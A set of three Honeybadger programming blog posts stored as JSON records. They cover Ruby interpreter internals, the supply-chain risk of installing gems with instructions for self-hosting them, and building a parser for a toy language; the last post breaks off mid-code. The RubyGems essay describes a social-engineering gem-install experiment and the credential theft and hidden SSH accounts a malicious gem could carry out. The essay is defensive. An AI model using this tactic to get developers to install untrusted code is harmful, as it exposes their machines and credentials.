{"website": "Honey-Badger", "title": "How Ruby Interprets and Runs Your Programs", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-ruby-interprets-and-runs-your-programs/", "abstract": "The more you know about your tools, the better decisions you will make as a developer. It's often useful — especially when debugging performance issues — to understand what Ruby is actually doing when it runs your program. In this post we'll follow the journey of a simple program as it's lexed, parsed and compiled into bytecode. We'll use the tools that Ruby gives us to spy on the interpreter every step of the way. Don't worry — even if you're not an expert this post should be pretty easy to follow. It's more of a guided tour than a technical manual. Meet our sample program As an example, I'm going to use a single if/else statement. To save space, I'll write this using the ternary operator. But don't be fooled, it's just an if/else. x > 100 ? 'foo' : 'bar' As you'll see, even a simple program like this gets translated into quite a lot of data as it is processed. Note: All of the examples in this post were written in Ruby (MRI) 2.2. If you're using other implementations of Ruby, they probably won't work. Tokenizing Before the Ruby interpreter can run your program it has to convert it from a somewhat free-form programming language into more structured data. The first step might be to break the program into chunks. These chunks are called tokens. # This is a string\n\"x > 1\"\n\n# These are tokens\n[\"x\", \">\", \"1\"] The Ruby standard library provides a module called Ripper that lets us process Ruby code in much the same way as the Ruby interpreter. In the example below we are using the tokenize method on our Ruby code. As you can see, it returns an array of tokens. require 'ripper' Ripper . tokenize ( \"x > 1 ? 'foo' : 'bar'\" ) # => [\"x\", \" \", \">\", \" \", \"1\", \" \", \"?\", \" \", \"'\", \"foo\", \"'\", \" \", \":\", \" \", \"'\", \"bar\", \"'\"] The tokenizer is pretty stupid. You can feed it completely invalid Ruby and it will still tokenize it. # bad code Ripper . tokenize ( \"1var @= \\/ foobar`\" ) # => [\"1\", \"var\"] Lexing Lexing is one step beyond tokenization. The string is still broken into tokens, but additional data is added to the tokens. In the example below we are using Ripper to Lex our small program.  as you can see, it's now tagging each token as being an identifier :on_ident , an operator :on_op , an integer :on_int , etc. require 'ripper' require 'pp' pp Ripper . lex ( \"x > 100 ? 'foo' : 'bar'\" ) # [[[1, 0], :on_ident, \"x\"], #  [[1, 1], :on_sp, \" \"], #  [[1, 2], :on_op, \">\"], #  [[1, 3], :on_sp, \" \"], #  [[1, 4], :on_int, \"100\"], #  [[1, 5], :on_sp, \" \"], #  [[1, 6], :on_op, \"?\"], #  [[1, 7], :on_sp, \" \"], #  [[1, 8], :on_tstring_beg, \"'\"], #  [[1, 9], :on_tstring_content, \"foo\"], #  [[1, 12], :on_tstring_end, \"'\"], #  [[1, 13], :on_sp, \" \"], #  [[1, 14], :on_op, \":\"], #  [[1, 15], :on_sp, \" \"], #  [[1, 16], :on_tstring_beg, \"'\"], #  [[1, 17], :on_tstring_content, \"bar\"], #  [[1, 20], :on_tstring_end, \"'\"]] There is still no real syntax checking going on at this point. The lexer will happily process invalid code. Parsing Now that Ruby has broken up the code into more manageable chunks, it's time for parsing to begin. During the parsing stage, Ruby transforms the text into something called an abstract syntax tree, or AST. The abstract syntax tree is a representation of your program in memory. You might say that programming languages in general are just more user-friendly ways of describing abstract syntax trees. require 'ripper' require 'pp' pp Ripper . sexp ( \"x > 100 ? 'foo' : 'bar'\" ) # [:program, #  [[:ifop, #    [:binary, [:vcall, [:@ident, \"x\", [1, 0]]], :>, [:@int, \"100\", [1, 4]]], #    [:string_literal, [:string_content, [:@tstring_content, \"foo\", [1, 11]]]], #    [:string_literal, [:string_content, [:@tstring_content, \"foobar\", [1, 19]]]]]]] It might not be easy to read this output, but if you stare at it for long enough you can kind of see how it maps to the original program. # Define a progam [ :program , # Do an \"if\" operation [[ :ifop , # Check the conditional (x > 100) [ :binary , [ :vcall , [ :@ident , \"x\" , [ 1 , 0 ]]], : > , [ :@int , \"100\" , [ 1 , 4 ]]], # If true, return \"foo\" [ :string_literal , [ :string_content , [ :@tstring_content , \"foo\" , [ 1 , 11 ]]]], # If false, return \"bar\" [ :string_literal , [ :string_content , [ :@tstring_content , \"foobar\" , [ 1 , 19 ]]]]]]] At this point, the Ruby interpreter knows exactly what's you want it to do. It could run your program right now. And before Ruby 1.9, it would have. But now, there's one more step. Compiling to bytecode Instead of traversing the abstract syntax tree directly, nowadays Ruby compiles the abstract syntax tree into lower-level byte code. This byte code  is then run by the Ruby virtual machine. We can take a peek into the inner workings of the virtual machine via the RubyVM::InstructionSequence class.  In the example below, we compile our sample program and then disassemble it to make a human readable. puts RubyVM :: InstructionSequence . compile ( \"x > 100 ? 'foo' : 'bar'\" ). disassemble # == disasm: <RubyVM::InstructionSequence:<compiled>@<compiled>>========== # 0000 trace            1                                               (   1) # 0002 putself # 0003 opt_send_without_block <callinfo!mid:x, argc:0, FCALL|VCALL|ARGS_SIMPLE> # 0005 putobject        100 # 0007 opt_gt           <callinfo!mid:>, argc:1, ARGS_SIMPLE> # 0009 branchunless     15 # 0011 putstring        \"foo\" # 0013 leave # 0014 pop # 0015 putstring        \"bar\" # 0017 leave Whoa! This suddenly looks a lot more like assembly language than Ruby. Let's step through it and see if we can make sense of it. # Call the method `x` on self and save the result on the stack 0002 putself 0003 opt_send_without_block < callinfo!mid :x , argc : 0 , FCALL | VCALL | ARGS_SIMPLE > # Put the number 100 on the stack 0005 putobject 100 # Do the comparison (x > 100) 0007 opt_gt < callinfo!mid : > , argc : 1 , ARGS_SIMPLE > # If the comparison was false, go to line 15 000 9 branchunless 15 # If the comparison was true, return \"foo\" 0011 putstring \"foo\" 0013 leave 0014 pop # Here's line 15. We jumped here if comparison was false. Return \"bar\" 0015 putstring \"bar\" 0017 leave The ruby virtual machine (YARV) then steps through these instructions and executes them. That's it! Conclusion This ends our very simplified, cartoony tour of the Ruby interpreter. With the tools I've shown you here, it's possible to take a lot of the guesswork out of how Ruby is interpreting your programs. I mean, it doesn't get more concrete than an AST. And next time you're stumped by some weird performance issue, try looking at the bytecode. It probably won't solve your problem, but it might take your mind off of it. :)", "date": "2015-11-03"},
{"website": "Honey-Badger", "title": "The case against using RubyGems.org in production", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/stop-using-rubygemsorg-in-production/", "abstract": "A screed + a screencast showing you how to host your own gems Let’s get this out of the way: gems are awesome, and RubyGems.org is a great service. ...But lately I’ve been feeling queasy every time I add a new gem to an app. The more I think about it, the more it seems that the way we use gems isn’t just flawed. It’s a disaster waiting to happen. Social engineering FTW A few days ago at RubyNation, Ben Smith gave a great talk called Hacking With Gems . Not hacking on gems, but using gems as a way to hack...as an attack vector. He performed a cool experiment. If you were at the conference, you probably saw stacks of nicely printed cards next to the github stickers and other swag. The card said one thing: gem install rubynation . And about 10% of attendees did. What the gem didn't do The gem did some useful things. But what it didn’t do was more interesting. It didn’t: Steal the RubyGems.org credentials from your gemcutter dotfile Intercept plaintext passwords and store them in your rails /public directory Add a secret SSH account to your system But it could have. Ask Ben if you don’t believe me. This should scare you Let me just back up and say this again, so it will sink in. About 25 people - COMPUTER PROGRAMMERS - were manipulated into running arbitrary code on their development machines. A few even ran it as root. I don't mean to pick on these people. This is just the norm in the Ruby community. Why did it happen? People trust gems. Because they usually work. Because Rails is a gem. Because well-known folks like Aaron Patterson, Steve Klabnik, and Yehuda Katz maintain them. But it’s a problem when you start trusting people you don’t know. It's a problem when you type gem install rubynation with no more hesitation than you’d type gem install rails . And let’s be honest. Who hasn’t done this at least once? We’re lazy and gems are easy. Rubygems.org isn't to blame It just makes it extremely easy to do the wrong thing. To run untrusted code on your servers. To be uninformed about changes in code run on your servers. That's why I'm suggesting that we all stop using it in production. Solutions Signatures aren't enough Everybody should sign their gems. But signatures aren’t enough. A signature only verifies the identity of the publisher. It doesn’t tell you if they’re good, evil, or chaotic neutral. Nobody's coming to the rescue In a perfect world, we’d have a trusted organization that distributes versions of gems that are known to be good. If that rubs you the wrong way, then think about how organizations like Debian do something similar for Linux. If that still rubs you the wrong way....well I’m honored that you’re reading my blog, Mr. Stallman. Why do I say in a perfect world? Well, because the other alternatives are a ton of work, and I’d rather not do it. ...can one of you YC hopefuls get on this please? The only real option: DIY Unfortunately I have to live in this smelly old real world. The only real way to have total control over your gems is to. Review the code for treachery Host the gems yourself Fortunately, hosting your own gems is easy. I'll show you how. How to host your own gems It's not magic A gem “server” is just a bunch of flat files on the web. You can host them anywhere, even on S3 or dropbox. Make a Rails app as a testbench The only reason I'm using rails here is because it gives us a premade Gemfile to play with. This app does nothing. `$ rails new myapp\n$ cd myapp\n` Download the .gem files This bundler command will download all of the .gem files referenced by Gemfile.lock and put them in /vendor/cache `$ bundle package\n$ mkdir /tmp/gem_server\n$ mv vendor/cache/ /tmp/gem_server/gems\n` Generate the 'server' files To take a directory of .gem files and make them ready for serving, you run gem generate_index . `$ gem generate_index -d /tmp/gem_server/\n` Put it all online Now I wouldn't recommend this in production, but... `$ mv /tmp/gem_server /Users/snhorne/Dropbox/Public/\n` Edit your Gemfile and bundle update Update the \"source\" line to point to your new host instead of rubygems `# Gemfile\n\nsource 'https://dl.dropboxusercontent.com/u/12345/gem_server'\n...\ngem 'rails', '3.2.13'\n` Cool! It's pulling gems from my dropbox. `$ bundle update\nFetching gem metadata from https://dl.dropboxusercontent.com/u/12345/gem_server/.\nFetching full source index from https://dl.dropboxusercontent.com/u/12345/gem_server/\nUsing rake (10.1.0)\nUsing i18n (0.6.1)\nUsing multi_json (1.7.7)\nUsing activesupport (3.2.13)\n` Bonus: Private gems can be protected with HTTP basic authentication Just make your gemfile look like this: `# Gemfile\n\nsource 'https://username:password@example.com/'\n` Alternatives Does this approach not work for you? There are some free and commercial gem hosting solutions that give you a few more bells and whistles. Geminabox is an open source application that eliminates a lot of the command line work. Gemfury is a private gem hosting company. I've used them in the past to host some proprietary gems for a client. It was easy to set up and never had a problem.", "date": "2013-08-06"},
{"website": "Honey-Badger", "title": "Building a Programming Language in Ruby: The Parser", "author": ["Alex Braha Stoll"], "link": "https://www.honeybadger.io/blog/ruby-parser-stoffle/", "abstract": "Full Source on Github A complete implementation of the Stoffle programming language is available at GitHub . This reference implementation has a lot of comments to help make reading the code easier. Feel free to open an issue if you find bugs or have questions. In this blog post, we're going to implement the parser for Stoffle, a toy programing language built entirely in Ruby. You can read more about this project in the first part of this series . Building a parser from scratch gave me some unexpected insights and knowledge. I guess this experience may vary from individual to individual, but I think it is safe to assume that after this article, you will have acquired or deepened your knowledge of at least one of the following: You will start seeing source code differently and noticing its undeniable tree-like structure much more easily; You will have a deeper understanding of syntactic sugar and will start seeing it everywhere, be it in Stoffle, Ruby, or even other programming languages. I feel that a parser is a perfect example of the Pareto principle . The amount of work needed to create some extra-nice features, such as awesome error messages, is clearly greater and disproportionate to the effort required to get the basics up and running. We will focus on the essentials and leave improvements as a challenge to you, my dear reader. We may or may not handle some of the more interesting extras in a later article in this series. Syntactic Sugar Syntactic sugar is an expression used to denote constructs that make a language easier to use, but whose removal would not cause the programming language to lose functionality. A nice example is Ruby's elsif construct. In Stoffle, we do not have such a structure, so to express the same we are forced to be more verbose: if some_condition\n  # ...\nelse # oops, no elsif available\n  if another_condition\n    # ...\n  end\nend What is a Parser? We start with the source code, a raw sequence of characters. Then, as shown in the previous article in this series, the lexer groups these characters into sensible data structures called tokens. However, we are still left with data that are totally flat, something that still does not appropriately represent the nested nature of source code. Thus, the parser has the job of creating a tree from this sequence of characters. When it finishes its task, we will end up with data that are finally able to express how each part of our program nests and relates to each other. The tree created by the parser is, generally, called an abstract syntax tree (AST). As the name implies, we are dealing with a tree data structure, with its root representing the program itself and the children of this program node being the many expressions that make up our program. The word abstract in AST refers to our ability to abstract away parts that, in previous steps, were explicitly present. A good example is expression terminators (new lines in the case of Stoffle); they are considered when building the AST, but we don't need a specific node type to represent a terminator. However, remember, we did have an explicit token to represent a terminator. Wouldn't it be useful to have a visualization of an example AST? Your wish is an order! Below is a simple Stoffle program, which we will parse step-by-step later in this post, and its corresponding abstract syntax tree: fn double: num\n  num * 2\nend From Source to AST, a First Example In this section of the post, we are going to explore, step-by-step, how our parser handles a very simple Stoffle program, composed of a single line in which a variable binding is expressed (i.e., we assign a value to a variable). Here's the source, a simplified representation of the tokens produced by the lexer (these tokens are the input fed to our parser) and, finally, a visual representation of the AST we are going to produce to represent the program: Source my_var = 1 Tokens (the Output of the Lexer, the Input for the Parser) [:identifier, :'=', :number] Visual Representation of the Parser's Output (an Abstract Syntax Tree) As you might imagine, the core of our parser is very similar to the core of our lexer. In the case of the lexer, we had a bunch of characters to process. Now, we still have to iterate over a collection, but in the case of the parser, we will go over the list of tokens produced by our lexer friend. We have a single pointer ( @next_p ) to keep track of our position in the collection of tokens. This pointer marks the next token to be processed. Although we only have this single pointer, we have many other \"virtual\" pointers we can use as needed; they will appear as we move along the implementation. One such \"virtual\" pointer is current (basically, the token at @next_p - 1 ). #parse is the method to call to have the tokens transformed into an AST, which will be available at the @ast instance variable. The implementation of #parse is straightforward. We continue advancing through the collection by calling #consume and moving @next_p until there are no more tokens to be processed (i.e., while next_p < tokens.length ). #parse_expr_recursively may return an AST node or nothing at all; remember, we don't need to represent terminators in the AST, for example. If a node was built in the current iteration of the loop, we add it to @ast before continuing. It's important to keep in mind that #parse_expr_recursively is also moving @next_p since, when we find a token that marks the beginning of a specific construct, we have to advance multiple times until we are able to finally build a node fully representing what we are currently parsing. Imagine how many tokens we would have to consume to build a node representing an if . module Stoffle class Parser attr_accessor :tokens , :ast , :errors # ... def initialize ( tokens ) @tokens = tokens @ast = AST :: Program . new @next_p = 0 @errors = [] end def parse while pending_tokens? consume node = parse_expr_recursively ast << node if node != nil end end # ... end end In the snippet above, for the first time, we were presented with one of the many types of AST nodes that are part of our parser implementation. Below, we have the full source code for the AST::Program node type. As you might be guessing, this is the root of our tree, representing the whole program. Let's take a closer look at the most interesting bits of it: A Stoffle program is composed of @expressions ; these are the #children of an AST::Program node; As you will see again, every node type implements the #== method. As a consequence, it is easy to compare two simple nodes, as well as whole programs altogether! When comparing two programs (or two complex nodes), their equality will be determined by the equality of every children, the equality of every children of every children, and so on. This simple yet powerful strategy used by #== is extremely useful for testing our implementation. class Stoffle::AST::Program attr_accessor :expressions def initialize @expressions = [] end def << ( expr ) expressions << expr end def == ( other ) expressions == other & . expressions end def children expressions end end Expressions vs. Statements In some languages, many constructs don't produce a value; a conditional is a classic example. These are called statements . Other constructs, however, do evaluate to a value (e.g., a function call). These are called expressions . In other languages, however, everything is an expression and produces a value. Ruby is an example of this approach. Try, for example, typing the following snippet into IRB to find out to what value a method definition evaluates: irb(main):001:0> def two; 2; end If you are not feeling like firing up IRB, let me break the news to you; in Ruby, a method definition expression evaluates to a symbol (the method name). As you know, Stoffle is heavily inspired in Ruby, so in our little toy language, everything is also an expression. Keep in mind that these definitions are good enough for practical purposes, but there is not really a consensus, and you may see the terms statement and expression being defined differently elsewhere. Diving Deeper: Beginning the Implementation of #parse_expr_recursively As we just saw in the snippet above, #parse_expr_recursively is the method called to potentially build a new AST node. #parse_expr_recursively does use a plethora of other smaller methods in the parsing process, but we can say with tranquility that it's the real engine of our parser. Although it's not very long, this method is more difficult to digest. Therefore, we are going to chop it into two parts. In this section of the post, let's begin with its initial segment, which is already powerful enough to parse some simpler parts of the Stoffle programming language. As a refresher, remember that we are going through the steps necessary to parse a simple program consisting of a single variable binding expression: Source my_var = 1 Tokens (the Output of the Lexer, the Input for the Parser) [:identifier, :'=', :number] After looking at the tokens we have to deal with and imagining what the lexer output would be for other, similar simple expressions, it seems like a good idea to try to associate token types with specific parsing methods: def parse_expr_recursively parsing_function = determine_parsing_function if parsing_function . nil? unrecognized_token_error return end send ( parsing_function ) end In this initial implementation of #parse_expr_recursively , that's exactly what we do. Since there will be quite a lot of different token types we will have to handle, it's better to extract this decision-making process to a separate method - #determine_parsing_function , which we will see in a moment. When we are finished, there shouldn't be any tokens we don't recognize, but as a safeguard, we will check whether a parsing function is associated with the current token. If it's not, we will add an error to our instance variable @errors , which holds all issues that happened during the parsing. We will not cover it in detail here, but you can check the full implementation of the parser at GitHub if you are curious. #determine_parsing_function returns a symbol representing the name of the parsing method to be called. We will use Ruby's send to call the appropriate method on the fly. Determining the Parsing Method and Parsing a Variable Binding Next, let's take a look at #determine_parsing_function to understand this initial mechanism for calling specific methods to parse different constructs of Stoffle. #determine_parsing_function will be used for everything (e.g., keywords and unary operators) except binary operators. We will later explore the technique used in the case of binary operators. For now, let's check out #determine_parsing_function : def determine_parsing_function if [ :return , :identifier , :number , :string , :true , :false , :nil , :fn , :if , :while ]. include? ( current . type ) \"parse_ #{ current . type } \" . to_sym elsif current . type == :'(' :parse_grouped_expr elsif [ :\" \\n \" , :eof ]. include? ( current . type ) :parse_terminator elsif UNARY_OPERATORS . include? ( current . type ) :parse_unary_operator end end As explained before, #current is a virtual pointer to the token being processed at the moment. The implementation of #determine_parsing_function is very straightforward; we look at the current token (specifically, its type ) and return a symbol representing the appropriate method to be called. Remember that we are going through the steps necessary to parse a variable binding ( my_var = 1 ), so the token types we are handling are [:identifier, :'=', :number] . The current token type is :identifier , so #determine_parsing_function will return :parse_identifier , as you might be guessing. Let's glance at our next step, the #parse_identifier method: def parse_identifier lookahead . type == :'=' ? parse_var_binding : AST :: Identifier . new ( current . lexeme ) end Here, we have a very simple manifestation of, basically, what all other parse methods do. In #parse_identifier - and in other parse methods - we check the tokens to determine whether the structure we are expecting is actually present. We know we have an identifier, but we have to look at the next token to determine whether we are dealing with a variable binding, which will be the case if the next token type is :'=' , or if we just have an identifier by itself or participating in a more complex expression. Imagine, for example, an arithmetic expression in which we are manipulating values stored in variables. Since we do have a :'=' coming next, #parse_var_binding is going to be called: def parse_var_binding identifier = AST :: Identifier . new ( current . lexeme ) consume ( 2 ) AST :: VarBinding . new ( identifier , parse_expr_recursively ) end Here, we start by creating a new AST node to represent the identifier we are currently processing. The constructor for AST::Identifier expects the lexeme of the identifier token (i.e., the sequence of characters, the string \"my_var\" in our case), so that is what we supply to it. We then advance two spots in the stream of tokens under processing, making the token with type :number the next one to be analyzed. Recall that we are dealing with [:identifier, :'=', :number] . Finally, we build and return an AST node representing the variable binding. The constructor for AST::VarBinding expects two parameters: an identifier AST node (the left-hand side of the binding expression) and any valid expression (the right-hand side). There is one crucial thing to note here; to produce the right-hand side of the variable binding expression, we call #parse_expr_recursively again . This might feel a little bit odd at first, but keep in mind that a variable can be bound to a very complex expression, not only to a mere number, as is the case in our example. If we were to define our parsing strategy in one word, it would be recursive . Now, I guess you are starting to grasp why #parse_expr_recursively has the name it has. Before we finish this section, we should quickly explore both AST::Identifier and AST::VarBinding . First, AST::Identifier : class Stoffle::AST::Identifier < Stoffle :: AST :: Expression attr_accessor :name def initialize ( name ) @name = name end def == ( other ) name == other & . name end def children [] end end There's nothing fancy here. It is worth mentioning that the node stores the name of the variable and doesn't have children. Now, AST::VarBinding : class Stoffle::AST::VarBinding < Stoffle :: AST :: Expression attr_accessor :left , :right def initialize ( left , right ) @left = left @right = right end def == ( other ) children == other & . children end def children [ left , right ] end end The left-hand side is an AST::Identifier node. The right-hand side is almost every possible type of node - from a simple number, as in our example, to something more complex - representing the expression to which the identifier is bound. The #children of a variable binding are the AST nodes it holds in @left and @right . From Source to AST, a Second Example The current incarnation of #parse_expr_recursively is already able to parse some simple expressions, as we saw in the previous section. In this section, we will finish its implementation so that it's also able to parse more complex entities, such as binary and logical operators. Here, we will explore, step-by-step, how our parser handles a program that defines a function. Here's the source, a simplified representation of the tokens produced by the lexer and, as we had in the first section, a visual representation of the AST we will produce to represent the program: Source fn double: num\n  num * 2\nend Tokens (the Output of the Lexer, the Input for the Parser) [:fn, :identifier, :\":\", :identifier, :\"\\n\", :identifier, :*, :number, :\"\\n\", :end, :\"\\n\", :eof] Visual Representation of the Parser Output (an Abstract Syntax Tree) Before we move along, let's take a step back and talk about operator precedence rules. These are based on mathematical conventions; in mathematics, they are just conventions, and indeed, there's nothing fundamental that results in the operator precedence we are used to. These rules also allow us to determine the correct order for evaluating an expression and, in our case, for first parsing it. To define the precedence of each operator, we simply have a map (i.e., a Hash ) of token types and integers. Higher numbers mean an operator should be handled first : # We define these precedence rules at the top of Stoffle::Parser. module Stoffle class Parser # ... UNARY_OPERATORS = [ :'!' , :'-' ]. freeze BINARY_OPERATORS = [ :'+' , :'-' , :'*' , :'/' , :'==' , :'!=' , :'>' , :'<' , :'>=' , :'<=' ]. freeze LOGICAL_OPERATORS = [ :or , :and ]. freeze LOWEST_PRECEDENCE = 0 PREFIX_PRECEDENCE = 7 OPERATOR_PRECEDENCE = { or: 1 , and: 2 , '==' : 3 , '!=' : 3 , '>' : 4 , '<' : 4 , '>=' : 4 , '<=' : 4 , '+' : 5 , '-' : 5 , '*' : 6 , '/' : 6 , '(' : 8 }. freeze # ... end end The technique used in #parse_expr_recursively is based on the famous parser algorithm presented by computer scientist Vaughan Pratt in his 1973 paper, \"Top Down Operator Precedence\". As you will see, the algorithm is very simple, but a bit difficult to fully grasp. One could say that it feels a little bit magical. What we will do in this post to try to gain an intuitive understanding of the workings of this technique is go, step-by-step, through what happens as we parse the Stoffle snippet mentioned above. So, without further ado, here is the completed version of #parse_expr_recursively : def parse_expr_recursively ( precedence = LOWEST_PRECEDENCE ) parsing_function = determine_parsing_function if parsing_function . nil? unrecognized_token_error return end expr = send ( parsing_function ) return if expr . nil? # When expr is nil, it means we have reached a \\n or a eof. # Note that, here, we are checking the NEXT token. while nxt_not_terminator? && precedence < nxt_precedence infix_parsing_function = determine_infix_function ( nxt ) return expr if infix_parsing_function . nil? consume expr = send ( infix_parsing_function , expr ) end expr end #parse_expr_recursively now accepts a parameter, precedence . It represents the precedence \"level\" to be considered in a given call of the method. Additionally, the first part of the method is pretty much the same. Then - if we were able to build an expression in this first part - comes the novel piece of the method. While the next token is not a terminator (i.e., a line break or the end of the file) and the precedence (the precedence param) is lower than the precedence of the next token, we potentially continue consuming the token stream. Before looking inside the while , let's think a little bit about the meaning of its second condition ( precedence < nxt_precedence ). If the precedence of the next token is higher, the expression we have just built (the expr local variable) is probably a child of a node yet to be built (remember that we are building an AST, an abstract syntax tree ). Before going through the parsing of our Stoffle snippet, let's reflect on the parsing of a simple arithmetic expression: 2 + 2 . When parsing this expression, the first part of our method would build an AST::Number node representing the first 2 and store it in expr . Then, we would step into the while because the precedence of the next token ( :'+' ) would be higher than the default precedence. We would then have the parsing method to handle a sum called, passing it the AST::Number node and receiving back a node representing a binary operator ( AST::BinaryOperator ). Finally, we would overwrite the value stored in expr , the node representing the first 2 in 2 + 2 , with this new node representing the plus operator. Notice that in the end, this algorithm allowed us to rearrange the nodes ; we began with building the AST::Number node and ended up with it being a deeper node in our tree, as one of the children of the AST::BinaryOperator node. Parsing a Function Definition Step-by-Step Now that we have gone through an overall explanation of #parse_expr_recursively , let's return to our simple function definition: fn double: num\n  num * 2\nend Even the idea of taking a look at a simplified description of the parser execution as we parse this snippet may feel tiresome (and, indeed, maybe it is!), but I think it's very valuable for better understanding both #parse_expr_recursively and the parsing of specific bits (the function definition and the product operator). First things first, here are the token types we will be dealing with (below is the output for @tokens.map(&:type) , inside the parser after the lexer finished tokenizing the snippet we just saw): [ :fn , :identifier , :\":\" , :identifier , :\" \\n \" , :identifier , : * , :number , :\" \\n \" , :end , :\" \\n \" , :eof ] The table below shows the order in which the most important methods are called as we parse the tokens above. Keep in mind that this is a simplification, and if you want to really understand all the exact steps of the parser execution, I recommend using a Ruby debugger, such as Byebug, and advance line-by-line as the program executes. Our Parser Under a Microscope There is a test that uses this exact snippet we are exploring, which is available in the source of Stoffle. You can find it inside spec/lib/stoffle/parser_spec.rb; it's the test that uses the snippet called complex_program_ok_2.sfe . To explore parser execution step-by-step, you can edit the source and add a call to byebug at the beginning of Parser#parse , run only the aforementioned test with RSpec, and then use Byebug's step command to advance the program one line at a time. See more information about how Byebug works and all the available commands by visiting the project's README file at GitHub. Method called Current token Next token Notable variables / call results Obs parse nil :fn parse_expr_recursively :fn :identifier precedence = 0, parsing_function = :parse_fn parse_function_definition :fn :identifier parse_fn is an alias of parse_function_definition parse_function_params :identifier :\":\" parse_block :\"\\n\" :identifier parse_expr_recursively :identifier :* precedence = 0, parsing_function = :parse_identifier, nxt_precedence() returns 6, infix_parsing_function = :parse_binary_operator parse_identifier :identifier :* parse_binary_operator :* :number op_precedence = 6 parse_expr_recursively :number :\"\\n\" precedence = 6, parsing_function = :parse_number, nxt_precedence() returns 0 parse_number :number :\"\\n\" Now that we have a general notion of which methods are called, as well as the sequence, let's study some of the parsing methods we have not yet seen in greater detail. The #parse_function_definition Method The method #parse_function_definition was called when the current token was :fn and the next one was :identifier : def parse_function_definition return unless consume_if_nxt_is ( build_token ( :identifier )) fn = AST :: FunctionDefinition . new ( AST :: Identifier . new ( current . lexeme )) if nxt . type != :\" \\n \" && nxt . type != :':' unexpected_token_error return end fn . params = parse_function_params if nxt . type == :':' return unless consume_if_nxt_is ( build_token ( :\" \\n \" , \" \\n \" )) fn . body = parse_block fn end #consume_if_nxt_is - as you might be guessing - advances our pointer if the next token is of a given type. Otherwise, it adds an error to @errors . #consume_if_nxt_is is very useful - and is used in many parser methods - when we want to check the structure of the tokens to determine whether we have valid syntax. After doing that, the current token is of type :identifier (we are handling 'double' , the name of the function), and we build an AST::Identifier and pass it to the constructor for creating a node to represent a function definition ( AST::FunctionDefinition ). We are not going to see it in detail here, but basically, an AST::FunctionDefinition node expects the function name, potentially an array of parameters and the function body. The next step in #parse_function_definition is to verify whether the next token after the identifier is an expression terminator (i.e., a function without params) or a colon (i.e., a function with one or multiple parameters). If we do have parameters, as is the case with the double function we are defining, we call #parse_function_params to parse them. We will check out this method in a moment, but let's first continue and finish our exploration of #parse_function_definition . The last step is to do another syntax check to verify that there is a terminator after the function name + params and, then, proceed to parse the function body by calling #parse_block . Finally, we return fn , which holds our fully-built AST::FunctionDefinition instance, complete with a function name, parameters, and a body. The Nuts and Bolts of Function Parameters Parsing In the previous section, we saw that #parse_function_params gets called inside #parse_function_definition . If we go back to our table summarizing the execution flow and state of our parser, we can see that when #parse_function_params starts running, the current token is of type :identifier , and the next one is :\":\" (i.e., we have just finished parsing the function name). With all of this in mind, let's look at some more code: def parse_function_params consume return unless consume_if_nxt_is ( build_token ( :identifier )) identifiers = [] identifiers << AST :: Identifier . new ( current . lexeme ) while nxt . type == :',' consume return unless consume_if_nxt_is ( build_token ( :identifier )) identifiers << AST :: Identifier . new ( current . lexeme ) end identifiers end Before I explain each part of this method, let's recap the tokens we have to process and where we are in this job: [ :fn , :identifier , :\":\" , :identifier , :\" \\n \" , :identifier , : * , :number , :\" \\n \" , :end , :\" \\n \" , :eof ] # here ▲ The first part of #parse_function_params is straightforward. If we have valid syntax (at least one identifier after the : ), we end up moving our pointer by two positions: [ :fn , :identifier , :\":\" , :identifier , :\" \\n \" , :identifier , : * , :number , :\" \\n \" , :end , :\" \\n \" , :eof ] # ▲ Now, we are sitting at the first parameter to be parsed (a token of type :identifier ). As expected, we create an AST::Identifier and push it to an array of, potentially, multiple other parameters yet to be parsed. In the next bit of #parse_function_params , we continue parsing params as long as there are parameter separators (i.e., tokens of type :',' ). We end the method by returning the local var identifiers , an array with, potentially, multiple AST::Identifier nodes, each representing one param. However, in our case, this array has only one element. What About the Function Body? Now let's dive deep into the last part of parsing a function definition: dealing with its body. When #parse_block is called, we are sitting at the terminator that marked the end of the list of function parameters: [ :fn , :identifier , :\":\" , :identifier , :\" \\n \" , :identifier , : * , :number , :\" \\n \" , :end , :\" \\n \" , :eof ] # ▲ And, here's the implementation of #parse_block : def parse_block consume block = AST :: Block . new while current . type != :end && current . type != :eof && nxt . type != :else expr = parse_expr_recursively block << expr unless expr . nil? consume end unexpected_token_error ( build_token ( :eof )) if current . type == :eof block end AST::Block is the AST node for representing, well, a block of code. In other words, AST::Block just holds a list of expressions, in a very similar fashion as the root node of our program, an AST::Program node (as we saw at the beginning of this post). To parse the block (i.e., the function body), we continue advancing through unprocessed tokens until we encounter a token that marks the end of the block. To parse the expressions that compose the block, we use our already-known #parse_expr_recursively . We will step into this method call in just a moment; this is the point in which we will start parsing the product operation happening inside our double function. Following this closely will allow us to understand the use of precedence values inside #parse_expr_recursively and how an infix operator (the * in our case) gets dealt with. Before we do that, however, let's finish our exploration of #parse_block . Before returning an AST node representing our block, we check whether the current token is of type :eof . If this is the case, we have a syntax error since Stoffle requires a block to end with the end keyword. To wrap up the explanation of #parse_block , I should mention something you have probably noticed; one of the conditions of our loop verifies whether the next token is of type :else . This happens because #parse_block is shared by other parsing methods, including the methods responsible for parsing conditionals and loops. Pretty neat, huh?! Parsing Infix Operators The name may sound a bit fancy, but infix operators are, basically, those we are very used to seeing in arithmetic, plus some others that we may be more familiar with by being software developers: module Stoffle class Parser # ... BINARY_OPERATORS = [ :'+' , :'-' , :'*' , :'/' , :'==' , :'!=' , :'>' , :'<' , :'>=' , :'<=' ]. freeze LOGICAL_OPERATORS = [ :or , :and ]. freeze # ... end end They are expected to be used infixed when the infix notation is used, as is the case with Stoffle, which means they should appear in the middle of their two operands (e.g., as * appears in num * 2 in our double function). Something worth mentioning is that although the infix notation is pretty popular, there are other ways of positioning operators in relation to their operands. If you are curious, research a little bit about \"Polish notation\" and \"reverse Polish notation\" methods. To finish parsing our double function, we have to deal with the * operator: fn double: num\n  num * 2\nend In the previous section, we mentioned that parsing the expression that composes the body of double starts when #parse_expr_recursively is called within #parse_block . When that happens, here's our position in @tokens : [ :fn , :identifier , :\":\" , :identifier , :\" \\n \" , :identifier , : * , :number , :\" \\n \" , :end , :\" \\n \" , :eof ] # ▲ And, to refresh our memory, here's the code for #parse_expr_recursively again: def parse_expr_recursively ( precedence = LOWEST_PRECEDENCE ) parsing_function = determine_parsing_function if parsing_function . nil? unrecognized_token_error return end expr = send ( parsing_function ) return if expr . nil? # When expr is nil, it means we have reached a \\n or a eof. # Note that here, we are checking the NEXT token. while nxt_not_terminator? && precedence < nxt_precedence infix_parsing_function = 